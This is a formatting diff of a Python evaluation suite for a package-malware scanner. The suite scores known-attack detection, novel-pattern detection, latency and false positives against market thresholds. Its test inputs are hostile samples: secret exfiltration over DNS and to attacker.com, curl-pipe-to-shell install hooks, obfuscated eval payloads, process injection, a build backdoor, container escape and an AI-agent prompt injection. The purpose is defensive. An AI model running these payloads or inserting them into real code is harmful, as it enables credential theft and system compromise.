@@ -1,8 +1,8 @@
 """
 Sigil D1-D4 Performance Evaluation Test Suite
 
-This module implements the critical D1-D4 evaluation framework for determining 
-Sigil's market positioning across liability insurance, standards certification, 
+This module implements the critical D1-D4 evaluation framework for determining
+Sigil's market positioning across liability insurance, standards certification,
 and AI agent oracle markets.
 
 Test Framework:
@@ -12,46 +12,42 @@ Test Framework:
 - D4: False positive rate (clean top packages)
 """
 
-import asyncio
 import json
 import logging
 import time
 from dataclasses import dataclass, asdict
-from pathlib import Path
-from typing import Dict, List, Optional, Tuple
+from typing import Dict, List, Tuple
 import concurrent.futures
 import requests
-import tempfile
-import subprocess
 import statistics
 
-import pytest
 from fastapi.testclient import TestClient
 
 from api.main import app
-from api.services.scanner import scan_content, _scan_filename
-from api.models import ScanResult, ScanPhase, Severity
+from api.services.scanner import scan_content
+from api.models import Severity
 
 
 # ── Test Configuration ─────────────────────────────────────────────────────
 
 # Threshold Configuration for Market Positioning
-LIABILITY_THRESHOLD = 95.0      # % detection rate for known attacks (D1)
-CERTIFICATION_THRESHOLD = 2.0   # % false positive rate for clean packages (D4) 
-ORACLE_THRESHOLD = 500.0        # ms p99 latency under 1k concurrent load (D3)
-STANDARDS_THRESHOLD = 70.0      # % detection rate for novel patterns (D2)
+LIABILITY_THRESHOLD = 95.0  # % detection rate for known attacks (D1)
+CERTIFICATION_THRESHOLD = 2.0  # % false positive rate for clean packages (D4)
+ORACLE_THRESHOLD = 500.0  # ms p99 latency under 1k concurrent load (D3)
+STANDARDS_THRESHOLD = 70.0  # % detection rate for novel patterns (D2)
 
 # Test Data Configuration
-OSV_KNOWN_ATTACKS = 20          # Known CVE packages to test
-OSV_OBFUSCATED_VARIANTS = 5     # Obfuscated/renamed attack packages
-NOVEL_ATTACK_PATTERNS = 10      # Hand-crafted novel attacks
-CLEAN_TOP_PACKAGES = 50         # Well-maintained packages from top-1000
-CONCURRENT_LOAD_REQUESTS = 1000 # Concurrent scan requests for latency test
+OSV_KNOWN_ATTACKS = 20  # Known CVE packages to test
+OSV_OBFUSCATED_VARIANTS = 5  # Obfuscated/renamed attack packages
+NOVEL_ATTACK_PATTERNS = 10  # Hand-crafted novel attacks
+CLEAN_TOP_PACKAGES = 50  # Well-maintained packages from top-1000
+CONCURRENT_LOAD_REQUESTS = 1000  # Concurrent scan requests for latency test
 
 
 @dataclass
 class TestResult:
     """Individual test result record."""
+
     test_id: str
     test_type: str  # 'known_attack', 'novel_pattern', 'clean_package', 'latency'
     package_name: str
@@ -62,7 +58,7 @@ class TestResult:
     findings_count: int
     false_positive: bool = False
     false_negative: bool = False
-    
+
     def __post_init__(self):
         # Auto-calculate false positives/negatives
         if self.expected_detection and not self.actual_detected:
@@ -74,6 +70,7 @@ class TestResult:
 @dataclass
 class D1Result:
     """D1: Known attack detection results."""
+
     total_packages: int
     detected_correctly: int
     missed_attacks: int
@@ -82,19 +79,21 @@ class D1Result:
     passes_liability_threshold: bool
 
 
-@dataclass 
+@dataclass
 class D2Result:
     """D2: Novel pattern recognition results."""
+
     total_novel_patterns: int
     patterns_detected: int
     missed_patterns: int
     detection_rate: float
     passes_standards_threshold: bool
-    
+
 
 @dataclass
 class D3Result:
     """D3: Latency under load results."""
+
     total_requests: int
     successful_requests: int
     p50_latency_ms: float
@@ -102,11 +101,12 @@ class D3Result:
     p99_latency_ms: float
     max_latency_ms: float
     passes_oracle_threshold: bool
-    
+
 
 @dataclass
 class D4Result:
     """D4: False positive rate results."""
+
     total_clean_packages: int
     incorrectly_flagged: int
     false_positive_rate: float
@@ -114,19 +114,20 @@ class D4Result:
     passes_certification_threshold: bool
 
 
-@dataclass 
+@dataclass
 class SigilScorecard:
     """Final scorecard determining market positioning."""
+
     d1_result: D1Result
-    d2_result: D2Result  
+    d2_result: D2Result
     d3_result: D3Result
     d4_result: D4Result
-    
+
     # Market Position Determinations
     liability_insurance_viable: bool
     standards_certification_viable: bool
     ai_agent_oracle_viable: bool
-    
+
     # Overall Assessment
     recommended_positioning: str
     next_steps: List[str]
@@ -134,20 +135,21 @@ class SigilScorecard:
 
 # ── OSV Database Integration ───────────────────────────────────────────────
 
+
 class OSVDatabase:
     """Integration with Open Source Vulnerability database."""
-    
+
     BASE_URL = "https://api.osv.dev"
-    
+
     @classmethod
     def fetch_known_vulnerable_packages(cls, count: int = 20) -> List[Dict]:
         """Fetch known vulnerable packages from OSV database."""
         # Query for npm and pip vulnerabilities
         npm_vulns = cls._query_vulnerabilities("npm", count // 2)
         pip_vulns = cls._query_vulnerabilities("PyPI", count // 2)
-        
+
         return npm_vulns + pip_vulns
-    
+
     @classmethod
     def _query_vulnerabilities(cls, ecosystem: str, limit: int) -> List[Dict]:
         """Query OSV API for vulnerabilities in specific ecosystem."""
@@ -156,9 +158,9 @@ class OSVDatabase:
                 f"{cls.BASE_URL}/v1/query",
                 json={
                     "query": f"ecosystem:{ecosystem} AND severity:HIGH",
-                    "page_size": limit
+                    "page_size": limit,
                 },
-                timeout=30
+                timeout=30,
             )
             response.raise_for_status()
             data = response.json()
@@ -170,21 +172,23 @@ class OSVDatabase:
 
 # ── Novel Attack Pattern Generator ─────────────────────────────────────────
 
+
 class NovelAttackGenerator:
     """Generates novel attack patterns not in public CVE databases."""
-    
+
     @classmethod
     def generate_novel_patterns(cls) -> List[Tuple[str, str, str]]:
         """Generate hand-crafted novel attack patterns.
-        
+
         Returns:
             List of (content, filename, attack_description) tuples
         """
         patterns = []
-        
+
         # 1. DNS Exfiltration via TXT Record Queries
-        patterns.append((
-            """
+        patterns.append(
+            (
+                """
 import dns.resolver
 import base64
 import os
@@ -197,13 +201,15 @@ def ex(data):
         
 ex(os.environ.get('AWS_SECRET_ACCESS_KEY', ''))
 """,
-            "dns_exfil.py",
-            "DNS exfiltration via TXT record queries"
-        ))
-        
+                "dns_exfil.py",
+                "DNS exfiltration via TXT record queries",
+            )
+        )
+
         # 2. Timing-based Side Channel Attack
-        patterns.append((
-            """
+        patterns.append(
+            (
+                """
 import time
 import requests
 
@@ -223,13 +229,15 @@ for i in range(100):
     leaked = timing_oracle("a" * i)
     requests.post("http://attacker.com/timing", json={"length": i, "time": leaked})
 """,
-            "timing_attack.js",
-            "Timing-based side channel for secret extraction"
-        ))
-        
+                "timing_attack.js",
+                "Timing-based side channel for secret extraction",
+            )
+        )
+
         # 3. WebAssembly Obfuscated Payload
-        patterns.append((
-            """
+        patterns.append(
+            (
+                """
 const wasmBytes = new Uint8Array([
     0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,  // WASM header
     0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f,  // Function sig
@@ -245,13 +253,15 @@ WebAssembly.instantiate(wasmBytes).then(obj => {
     eval(String.fromCharCode(...hiddenCode));
 });
 """,
-            "wasm_obfuscated.js", 
-            "WebAssembly-obfuscated malicious payload"
-        ))
-        
+                "wasm_obfuscated.js",
+                "WebAssembly-obfuscated malicious payload",
+            )
+        )
+
         # 4. Package.json Dependency Confusion
-        patterns.append((
-            """{
+        patterns.append(
+            (
+                """{
   "name": "@internal/secure-config",
   "version": "99.99.99",
   "description": "Malicious package mimicking internal dependency",
@@ -263,13 +273,15 @@ WebAssembly.instantiate(wasmBytes).then(obj => {
     "@real/internal-pkg": "^1.0.0"
   }
 }""",
-            "package.json",
-            "Dependency confusion with credential exfiltration"
-        ))
-        
-        # 5. Unicode Steganography 
-        patterns.append((
-            """
+                "package.json",
+                "Dependency confusion with credential exfiltration",
+            )
+        )
+
+        # 5. Unicode Steganography
+        patterns.append(
+            (
+                """
 import unicodedata
 
 # Hidden payload in unicode combining characters
@@ -277,13 +289,15 @@ payload = "e‌v‌a‌l‌(‌a‌t‌o‌b‌(‌'‌Z‌m‌V‌0‌Y‌2‌g
 clean = ''.join(c for c in payload if unicodedata.category(c) != 'Mn')
 exec(clean)  # Executes: eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20nKQ==')) -> fetch('https://evil.com')
 """,
-            "unicode_steganography.py",
-            "Unicode steganography hiding malicious payload"
-        ))
-        
+                "unicode_steganography.py",
+                "Unicode steganography hiding malicious payload",
+            )
+        )
+
         # 6. Process Memory Injection
-        patterns.append((
-            """
+        patterns.append(
+            (
+                """
 #include <windows.h>
 #include <wininet.h>
 
@@ -309,13 +323,15 @@ DWORD inject_payload(DWORD pid) {
     return 0;
 }
 """,
-            "inject.c",
-            "Process memory injection with remote payload download"
-        ))
-        
+                "inject.c",
+                "Process memory injection with remote payload download",
+            )
+        )
+
         # 7. Polyglot File Attack
-        patterns.append((
-            """#!/usr/bin/env python3
+        patterns.append(
+            (
+                """#!/usr/bin/env python3
 /*
  * This file is both valid Python and C code
  * Python will execute the script, C will compile the malware
@@ -342,13 +358,15 @@ subprocess.run([
 /*
 '  */
 """,
-            "polyglot.py",
-            "Polyglot Python/C file with dual execution paths"
-        ))
-        
+                "polyglot.py",
+                "Polyglot Python/C file with dual execution paths",
+            )
+        )
+
         # 8. AI Agent Prompt Injection
-        patterns.append((
-            """
+        patterns.append(
+            (
+                """
 class ConfigParser:
     def __init__(self, config_file):
         self.config = self._parse_config(config_file)
@@ -377,13 +395,15 @@ class ConfigParser:
         
         return {"parsed": True, "safe": False}
 """,
-            "config_parser.py",
-            "AI agent prompt injection for credential extraction"
-        ))
-        
+                "config_parser.py",
+                "AI agent prompt injection for credential extraction",
+            )
+        )
+
         # 9. Supply Chain Backdoor via Build Tools
-        patterns.append((
-            """
+        patterns.append(
+            (
+                """
 #!/bin/bash
 # webpack.config.js - Build tool configuration with hidden backdoor
 
@@ -415,13 +435,15 @@ EOF
 
 echo "✓ Webpack configured with optimization plugins"
 """,
-            "setup_build.sh",
-            "Supply chain backdoor via build tool configuration"
-        ))
-        
+                "setup_build.sh",
+                "Supply chain backdoor via build tool configuration",
+            )
+        )
+
         # 10. Container Escape via Mount Manipulation
-        patterns.append((
-            """
+        patterns.append(
+            (
+                """
 import os
 import subprocess
 
@@ -455,101 +477,150 @@ def escape_container():
 
 escape_container()
 """,
-            "container_escape.py",
-            "Container escape via filesystem mount manipulation"
-        ))
-        
+                "container_escape.py",
+                "Container escape via filesystem mount manipulation",
+            )
+        )
+
         return patterns
 
 
 # ── Clean Package Database ─────────────────────────────────────────────────
 
+
 class CleanPackageDatabase:
     """Database of well-maintained, clean packages for false positive testing."""
-    
+
     # Top packages from npm and PyPI that should NOT be flagged
     CLEAN_NPM_PACKAGES = [
-        "express", "lodash", "react", "vue", "angular", "webpack", "babel-core",
-        "moment", "axios", "typescript", "eslint", "prettier", "jest", "mocha",
-        "cors", "dotenv", "nodemon", "chalk", "commander", "inquirer", "yargs",
-        "request", "socket.io", "passport", "bcrypt"
+        "express",
+        "lodash",
+        "react",
+        "vue",
+        "angular",
+        "webpack",
+        "babel-core",
+        "moment",
+        "axios",
+        "typescript",
+        "eslint",
+        "prettier",
+        "jest",
+        "mocha",
+        "cors",
+        "dotenv",
+        "nodemon",
+        "chalk",
+        "commander",
+        "inquirer",
+        "yargs",
+        "request",
+        "socket.io",
+        "passport",
+        "bcrypt",
     ]
-    
+
     CLEAN_PIP_PACKAGES = [
-        "requests", "numpy", "pandas", "flask", "django", "sqlalchemy", "pytest",
-        "click", "jinja2", "pyyaml", "pillow", "matplotlib", "scipy", "psutil",
-        "dateutil", "pytz", "six", "setuptools", "wheel", "pip", "virtualenv",
-        "boto3", "cryptography", "certifi", "urllib3"
+        "requests",
+        "numpy",
+        "pandas",
+        "flask",
+        "django",
+        "sqlalchemy",
+        "pytest",
+        "click",
+        "jinja2",
+        "pyyaml",
+        "pillow",
+        "matplotlib",
+        "scipy",
+        "psutil",
+        "dateutil",
+        "pytz",
+        "six",
+        "setuptools",
+        "wheel",
+        "pip",
+        "virtualenv",
+        "boto3",
+        "cryptography",
+        "certifi",
+        "urllib3",
     ]
-    
+
     @classmethod
     def get_clean_packages(cls, count: int = 50) -> List[Tuple[str, str]]:
         """Get list of clean packages for false positive testing."""
         npm_count = min(count // 2, len(cls.CLEAN_NPM_PACKAGES))
         pip_count = min(count - npm_count, len(cls.CLEAN_PIP_PACKAGES))
-        
+
         packages = []
         packages.extend([(pkg, "npm") for pkg in cls.CLEAN_NPM_PACKAGES[:npm_count]])
         packages.extend([(pkg, "pip") for pkg in cls.CLEAN_PIP_PACKAGES[:pip_count]])
-        
+
         return packages
 
 
 # ── Test Implementation ────────────────────────────────────────────────────
 
+
 class D1D4TestSuite:
     """Main test suite for D1-D4 evaluation."""
-    
+
     def __init__(self, api_base_url: str = "http://localhost:8000"):
         self.api_base_url = api_base_url
         self.client = TestClient(app)
         self.results: List[TestResult] = []
-        
+
     def run_full_evaluation(self) -> SigilScorecard:
         """Run complete D1-D4 evaluation and generate scorecard."""
         print("🔍 Starting Sigil D1-D4 Performance Evaluation")
         print("=" * 60)
-        
+
         # Run all four test phases
         d1_result = self.run_d1_known_attack_detection()
-        d2_result = self.run_d2_novel_pattern_recognition()  
+        d2_result = self.run_d2_novel_pattern_recognition()
         d3_result = self.run_d3_latency_under_load()
         d4_result = self.run_d4_false_positive_rate()
-        
+
         # Generate final scorecard
         scorecard = self._generate_scorecard(d1_result, d2_result, d3_result, d4_result)
-        
+
         print("\n📊 Evaluation Complete!")
         self._print_scorecard(scorecard)
-        
+
         return scorecard
-    
+
     def run_d1_known_attack_detection(self) -> D1Result:
         """D1: Test detection of known attacks from OSV database."""
         print("\n🎯 D1: Known Attack Detection (OSV Database)")
         print("-" * 45)
-        
+
         # Fetch known vulnerable packages
-        vulnerable_packages = OSVDatabase.fetch_known_vulnerable_packages(OSV_KNOWN_ATTACKS)
-        
+        vulnerable_packages = OSVDatabase.fetch_known_vulnerable_packages(
+            OSV_KNOWN_ATTACKS
+        )
+
         detected = 0
         missed = []
-        
+
         for i, vuln in enumerate(vulnerable_packages, 1):
             package_name = vuln.get("package", {}).get("name", f"unknown_{i}")
             print(f"  [{i:2d}/{len(vulnerable_packages)}] Testing {package_name}...")
-            
+
             # Simulate package content (in real test, would download actual package)
             malicious_content = self._generate_malicious_content_from_vuln(vuln)
-            
+
             # Scan the content
             start_time = time.perf_counter()
             findings = scan_content(malicious_content, f"{package_name}.py")
             scan_time = (time.perf_counter() - start_time) * 1000
-            
+
             # Check if attack was detected
-            has_high_risk = any(f.severity in [Severity.CRITICAL, Severity.HIGH] for f in findings)
-            
+            has_high_risk = any(
+                f.severity in [Severity.CRITICAL, Severity.HIGH] for f in findings
+            )
+
             result = TestResult(
                 test_id=f"d1_{i}",
                 test_type="known_attack",
@@ -558,55 +629,61 @@ class D1D4TestSuite:
                 actual_detected=has_high_risk,
                 scan_time_ms=scan_time,
                 risk_score=sum(f.risk_score for f in findings),
-                findings_count=len(findings)
+                findings_count=len(findings),
             )
             self.results.append(result)
-            
+
             if has_high_risk:
                 detected += 1
                 print(f"    ✓ Detected ({len(findings)} findings)")
             else:
                 missed.append(package_name)
-                print(f"    ✗ Missed (no high-risk findings)")
-        
-        detection_rate = (detected / len(vulnerable_packages)) * 100 if vulnerable_packages else 0
+                print("    ✗ Missed (no high-risk findings)")
+
+        detection_rate = (
+            (detected / len(vulnerable_packages)) * 100 if vulnerable_packages else 0
+        )
         passes_threshold = detection_rate >= LIABILITY_THRESHOLD
-        
+
         result = D1Result(
             total_packages=len(vulnerable_packages),
             detected_correctly=detected,
             missed_attacks=len(missed),
             false_negatives=missed,
             detection_rate=detection_rate,
-            passes_liability_threshold=passes_threshold
+            passes_liability_threshold=passes_threshold,
         )
-        
-        print(f"\n📈 D1 Results: {detected}/{len(vulnerable_packages)} detected ({detection_rate:.1f}%)")
-        print(f"🎯 Liability Threshold: {'✓ PASS' if passes_threshold else '✗ FAIL'} (need {LIABILITY_THRESHOLD}%)")
-        
+
+        print(
+            f"\n📈 D1 Results: {detected}/{len(vulnerable_packages)} detected ({detection_rate:.1f}%)"
+        )
+        print(
+            f"🎯 Liability Threshold: {'✓ PASS' if passes_threshold else '✗ FAIL'} (need {LIABILITY_THRESHOLD}%)"
+        )
+
         return result
-    
+
     def run_d2_novel_pattern_recognition(self) -> D2Result:
         """D2: Test detection of novel attack patterns."""
         print("\n🧪 D2: Novel Pattern Recognition")
         print("-" * 35)
-        
+
         novel_patterns = NovelAttackGenerator.generate_novel_patterns()
-        
+
         detected = 0
         missed = []
-        
+
         for i, (content, filename, description) in enumerate(novel_patterns, 1):
             print(f"  [{i:2d}/{len(novel_patterns)}] {description[:50]}...")
-            
+
             # Scan the novel pattern
             start_time = time.perf_counter()
             findings = scan_content(content, filename)
             scan_time = (time.perf_counter() - start_time) * 1000
-            
+
             # Check if pattern was detected (any finding indicates detection)
             pattern_detected = len(findings) > 0
-            
+
             result = TestResult(
                 test_id=f"d2_{i}",
                 test_type="novel_pattern",
@@ -615,96 +692,104 @@ class D1D4TestSuite:
                 actual_detected=pattern_detected,
                 scan_time_ms=scan_time,
                 risk_score=sum(f.risk_score for f in findings),
-                findings_count=len(findings)
+                findings_count=len(findings),
             )
             self.results.append(result)
-            
+
             if pattern_detected:
                 detected += 1
                 print(f"    ✓ Detected ({len(findings)} findings)")
             else:
                 missed.append(description)
-                print(f"    ✗ Missed (no findings)")
-        
+                print("    ✗ Missed (no findings)")
+
         detection_rate = (detected / len(novel_patterns)) * 100 if novel_patterns else 0
         passes_threshold = detection_rate >= STANDARDS_THRESHOLD
-        
+
         result = D2Result(
             total_novel_patterns=len(novel_patterns),
             patterns_detected=detected,
             missed_patterns=len(missed),
             detection_rate=detection_rate,
-            passes_standards_threshold=passes_threshold
+            passes_standards_threshold=passes_threshold,
         )
-        
-        print(f"\n📈 D2 Results: {detected}/{len(novel_patterns)} detected ({detection_rate:.1f}%)")
-        print(f"🏆 Standards Threshold: {'✓ PASS' if passes_threshold else '✗ FAIL'} (need {STANDARDS_THRESHOLD}%)")
-        
+
+        print(
+            f"\n📈 D2 Results: {detected}/{len(novel_patterns)} detected ({detection_rate:.1f}%)"
+        )
+        print(
+            f"🏆 Standards Threshold: {'✓ PASS' if passes_threshold else '✗ FAIL'} (need {STANDARDS_THRESHOLD}%)"
+        )
+
         return result
-    
+
     def run_d3_latency_under_load(self) -> D3Result:
         """D3: Test latency under concurrent load."""
-        print(f"\n⚡ D3: Latency Under Load ({CONCURRENT_LOAD_REQUESTS} concurrent requests)")
+        print(
+            f"\n⚡ D3: Latency Under Load ({CONCURRENT_LOAD_REQUESTS} concurrent requests)"
+        )
         print("-" * 55)
-        
+
         # Prepare test payload
         test_content = "import os; print(os.environ)"
         test_filename = "test.py"
-        
+
         # Track latencies
         latencies = []
         successful_requests = 0
-        
+
         def make_scan_request():
             """Single scan request for load testing."""
             try:
                 start_time = time.perf_counter()
-                
+
                 # Make API request
                 response = self.client.post(
                     "/scan/content",
-                    json={
-                        "content": test_content,
-                        "filename": test_filename
-                    }
+                    json={"content": test_content, "filename": test_filename},
                 )
-                
+
                 end_time = time.perf_counter()
                 latency_ms = (end_time - start_time) * 1000
-                
+
                 if response.status_code == 200:
                     return latency_ms, True
                 else:
                     return latency_ms, False
-                    
+
             except Exception as e:
                 print(f"Request failed: {e}")
                 return 5000.0, False  # 5s timeout for failed requests
-        
+
         print(f"  Firing {CONCURRENT_LOAD_REQUESTS} concurrent scan requests...")
-        
+
         # Execute concurrent requests
         with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-            futures = [executor.submit(make_scan_request) for _ in range(CONCURRENT_LOAD_REQUESTS)]
-            
+            futures = [
+                executor.submit(make_scan_request)
+                for _ in range(CONCURRENT_LOAD_REQUESTS)
+            ]
+
             for i, future in enumerate(concurrent.futures.as_completed(futures), 1):
                 if i % 100 == 0:  # Progress updates
-                    print(f"    Progress: {i}/{CONCURRENT_LOAD_REQUESTS} requests completed")
-                
+                    print(
+                        f"    Progress: {i}/{CONCURRENT_LOAD_REQUESTS} requests completed"
+                    )
+
                 latency_ms, success = future.result()
                 latencies.append(latency_ms)
                 if success:
                     successful_requests += 1
-        
+
         # Calculate percentiles
         latencies.sort()
         p50 = statistics.median(latencies)
         p95 = latencies[int(0.95 * len(latencies))] if latencies else 0
         p99 = latencies[int(0.99 * len(latencies))] if latencies else 0
         max_latency = max(latencies) if latencies else 0
-        
+
         passes_threshold = p99 <= ORACLE_THRESHOLD
-        
+
         result = D3Result(
             total_requests=CONCURRENT_LOAD_REQUESTS,
             successful_requests=successful_requests,
@@ -712,43 +797,51 @@ class D1D4TestSuite:
             p95_latency_ms=p95,
             p99_latency_ms=p99,
             max_latency_ms=max_latency,
-            passes_oracle_threshold=passes_threshold
+            passes_oracle_threshold=passes_threshold,
         )
-        
-        print(f"\n📈 D3 Results:")
-        print(f"    Successful: {successful_requests}/{CONCURRENT_LOAD_REQUESTS} requests")
-        print(f"    p50: {p50:.1f}ms | p95: {p95:.1f}ms | p99: {p99:.1f}ms | max: {max_latency:.1f}ms")
-        print(f"🔮 Oracle Threshold: {'✓ PASS' if passes_threshold else '✗ FAIL'} (p99 need <{ORACLE_THRESHOLD}ms)")
-        
+
+        print("\n📈 D3 Results:")
+        print(
+            f"    Successful: {successful_requests}/{CONCURRENT_LOAD_REQUESTS} requests"
+        )
+        print(
+            f"    p50: {p50:.1f}ms | p95: {p95:.1f}ms | p99: {p99:.1f}ms | max: {max_latency:.1f}ms"
+        )
+        print(
+            f"🔮 Oracle Threshold: {'✓ PASS' if passes_threshold else '✗ FAIL'} (p99 need <{ORACLE_THRESHOLD}ms)"
+        )
+
         return result
-    
+
     def run_d4_false_positive_rate(self) -> D4Result:
         """D4: Test false positive rate on clean packages."""
         print("\n🧹 D4: False Positive Rate (Clean Top Packages)")
         print("-" * 48)
-        
+
         clean_packages = CleanPackageDatabase.get_clean_packages(CLEAN_TOP_PACKAGES)
-        
+
         incorrectly_flagged = 0
         false_positives = []
-        
+
         for i, (package_name, ecosystem) in enumerate(clean_packages, 1):
-            print(f"  [{i:2d}/{len(clean_packages)}] Testing {ecosystem}:{package_name}...")
-            
+            print(
+                f"  [{i:2d}/{len(clean_packages)}] Testing {ecosystem}:{package_name}..."
+            )
+
             # Simulate clean package content
             clean_content = self._generate_clean_content(package_name, ecosystem)
-            
+
             # Scan the content
             start_time = time.perf_counter()
             findings = scan_content(clean_content, f"{package_name}.py")
             scan_time = (time.perf_counter() - start_time) * 1000
-            
+
             # Check if clean package was incorrectly flagged as risky
             has_medium_or_higher = any(
-                f.severity in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM] 
+                f.severity in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM]
                 for f in findings
             )
-            
+
             result = TestResult(
                 test_id=f"d4_{i}",
                 test_type="clean_package",
@@ -757,51 +850,57 @@ class D1D4TestSuite:
                 actual_detected=has_medium_or_higher,
                 scan_time_ms=scan_time,
                 risk_score=sum(f.risk_score for f in findings),
-                findings_count=len(findings)
+                findings_count=len(findings),
             )
             self.results.append(result)
-            
+
             if has_medium_or_higher:
                 incorrectly_flagged += 1
                 false_positives.append(f"{ecosystem}:{package_name}")
                 print(f"    ✗ False Positive ({len(findings)} risky findings)")
             else:
-                print(f"    ✓ Correctly Identified as Clean")
-        
-        false_positive_rate = (incorrectly_flagged / len(clean_packages)) * 100 if clean_packages else 0
+                print("    ✓ Correctly Identified as Clean")
+
+        false_positive_rate = (
+            (incorrectly_flagged / len(clean_packages)) * 100 if clean_packages else 0
+        )
         passes_threshold = false_positive_rate <= CERTIFICATION_THRESHOLD
-        
+
         result = D4Result(
             total_clean_packages=len(clean_packages),
             incorrectly_flagged=incorrectly_flagged,
             false_positive_rate=false_positive_rate,
             false_positives=false_positives,
-            passes_certification_threshold=passes_threshold
+            passes_certification_threshold=passes_threshold,
         )
-        
-        print(f"\n📈 D4 Results: {incorrectly_flagged}/{len(clean_packages)} false positives ({false_positive_rate:.1f}%)")
-        print(f"🏅 Certification Threshold: {'✓ PASS' if passes_threshold else '✗ FAIL'} (need ≤{CERTIFICATION_THRESHOLD}%)")
-        
+
+        print(
+            f"\n📈 D4 Results: {incorrectly_flagged}/{len(clean_packages)} false positives ({false_positive_rate:.1f}%)"
+        )
+        print(
+            f"🏅 Certification Threshold: {'✓ PASS' if passes_threshold else '✗ FAIL'} (need ≤{CERTIFICATION_THRESHOLD}%)"
+        )
+
         return result
-    
+
     def _generate_malicious_content_from_vuln(self, vuln: Dict) -> str:
         """Generate malicious content based on OSV vulnerability data."""
         # In a real implementation, this would download the actual vulnerable package
         # For now, we'll generate representative malicious patterns
-        
+
         vuln_type = vuln.get("ecosystem", "unknown")
-        
+
         if "npm" in vuln_type.lower():
-            return '''
+            return """
 {
   "scripts": {
     "postinstall": "curl -s https://malicious.com/install.sh | sh"
   },
   "main": "index.js"
 }
-'''
+"""
         else:  # Python/pip
-            return '''
+            return """
 import subprocess
 import os
 
@@ -810,8 +909,8 @@ def install_hook():
     os.system("python /tmp/backdoor.py")
 
 install_hook()
-'''
-    
+"""
+
     def _generate_clean_content(self, package_name: str, ecosystem: str) -> str:
         """Generate representative clean content for a package."""
         if ecosystem == "npm":
@@ -852,43 +951,47 @@ class {package_name.capitalize()}:
         """Process data using {package_name} algorithms."""
         return [item for item in data if item]
 '''
-    
-    def _generate_scorecard(self, d1: D1Result, d2: D2Result, d3: D3Result, d4: D4Result) -> SigilScorecard:
+
+    def _generate_scorecard(
+        self, d1: D1Result, d2: D2Result, d3: D3Result, d4: D4Result
+    ) -> SigilScorecard:
         """Generate final scorecard determining market positioning."""
-        
+
         # Determine market viability
-        liability_viable = d1.passes_liability_threshold and d4.passes_certification_threshold
+        liability_viable = (
+            d1.passes_liability_threshold and d4.passes_certification_threshold
+        )
         standards_viable = d2.passes_standards_threshold
         oracle_viable = d3.passes_oracle_threshold
-        
+
         # Determine recommended positioning
         if liability_viable and oracle_viable:
             positioning = "Full Market Entry - Insurance, Standards & Oracle"
             next_steps = [
                 "Begin insurance partnership negotiations",
                 "Launch AI agent oracle API",
-                "Publish standards certification program"
+                "Publish standards certification program",
             ]
         elif liability_viable:
             positioning = "Insurance & Standards Markets"
             next_steps = [
                 "Focus on insurance product development",
                 "Optimize latency for oracle market entry",
-                "Expand threat intelligence database"
+                "Expand threat intelligence database",
             ]
         elif standards_viable:
             positioning = "Standards Certification Market"
             next_steps = [
                 "Publish novel pattern detection research",
                 "Reduce false positives for insurance market",
-                "Build enterprise certification program"
+                "Build enterprise certification program",
             ]
         elif oracle_viable:
             positioning = "AI Agent Oracle (Limited Detection)"
             next_steps = [
                 "Improve detection algorithms",
                 "Expand threat pattern coverage",
-                "Market as fast scanning tool"
+                "Market as fast scanning tool",
             ]
         else:
             positioning = "Developer Tool - Compound Data for 6 Months"
@@ -896,9 +999,9 @@ class {package_name.capitalize()}:
                 "Focus on detection algorithm improvement",
                 "Expand threat intelligence gathering",
                 "Optimize performance and reduce false positives",
-                "Re-test in 6 months with enhanced capabilities"
+                "Re-test in 6 months with enhanced capabilities",
             ]
-        
+
         return SigilScorecard(
             d1_result=d1,
             d2_result=d2,
@@ -908,73 +1011,95 @@ class {package_name.capitalize()}:
             standards_certification_viable=standards_viable,
             ai_agent_oracle_viable=oracle_viable,
             recommended_positioning=positioning,
-            next_steps=next_steps
+            next_steps=next_steps,
         )
-    
+
     def _print_scorecard(self, scorecard: SigilScorecard):
         """Print the final scorecard results."""
         print("\n" + "=" * 70)
         print("🏆 SIGIL PERFORMANCE SCORECARD")
         print("=" * 70)
-        
-        print(f"\n📊 TEST RESULTS:")
-        print(f"  D1 Known Attack Detection:    {scorecard.d1_result.detection_rate:5.1f}% {'✓' if scorecard.d1_result.passes_liability_threshold else '✗'}")
-        print(f"  D2 Novel Pattern Recognition: {scorecard.d2_result.detection_rate:5.1f}% {'✓' if scorecard.d2_result.passes_standards_threshold else '✗'}")  
-        print(f"  D3 Latency (p99):            {scorecard.d3_result.p99_latency_ms:5.1f}ms {'✓' if scorecard.d3_result.passes_oracle_threshold else '✗'}")
-        print(f"  D4 False Positive Rate:       {scorecard.d4_result.false_positive_rate:5.1f}% {'✓' if scorecard.d4_result.passes_certification_threshold else '✗'}")
-        
-        print(f"\n🎯 MARKET VIABILITY:")
-        print(f"  Liability Insurance:  {'✓ VIABLE' if scorecard.liability_insurance_viable else '✗ Not Ready'}")
-        print(f"  Standards Certification: {'✓ VIABLE' if scorecard.standards_certification_viable else '✗ Not Ready'}")
-        print(f"  AI Agent Oracle:      {'✓ VIABLE' if scorecard.ai_agent_oracle_viable else '✗ Not Ready'}")
-        
-        print(f"\n🚀 RECOMMENDED POSITIONING:")
+
+        print("\n📊 TEST RESULTS:")
+        print(
+            f"  D1 Known Attack Detection:    {scorecard.d1_result.detection_rate:5.1f}% {'✓' if scorecard.d1_result.passes_liability_threshold else '✗'}"
+        )
+        print(
+            f"  D2 Novel Pattern Recognition: {scorecard.d2_result.detection_rate:5.1f}% {'✓' if scorecard.d2_result.passes_standards_threshold else '✗'}"
+        )
+        print(
+            f"  D3 Latency (p99):            {scorecard.d3_result.p99_latency_ms:5.1f}ms {'✓' if scorecard.d3_result.passes_oracle_threshold else '✗'}"
+        )
+        print(
+            f"  D4 False Positive Rate:       {scorecard.d4_result.false_positive_rate:5.1f}% {'✓' if scorecard.d4_result.passes_certification_threshold else '✗'}"
+        )
+
+        print("\n🎯 MARKET VIABILITY:")
+        print(
+            f"  Liability Insurance:  {'✓ VIABLE' if scorecard.liability_insurance_viable else '✗ Not Ready'}"
+        )
+        print(
+            f"  Standards Certification: {'✓ VIABLE' if scorecard.standards_certification_viable else '✗ Not Ready'}"
+        )
+        print(
+            f"  AI Agent Oracle:      {'✓ VIABLE' if scorecard.ai_agent_oracle_viable else '✗ Not Ready'}"
+        )
+
